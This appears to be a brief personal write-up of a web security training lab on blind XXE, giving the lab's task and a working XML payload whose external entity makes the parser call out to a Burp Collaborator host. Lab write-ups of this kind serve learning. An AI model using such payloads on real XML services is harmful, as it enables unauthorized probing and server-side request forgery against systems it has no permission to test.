# Lab: Blind XXE with out-of-band interaction

 This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

---

payload

```<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE mydoc [<!ENTITY xxe SYSTEM "http://sad.burpcollaborator.net/" > ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>```

i don't have burp bro so i just entered a random subdomain of burpcollaborator, till i get my own public server
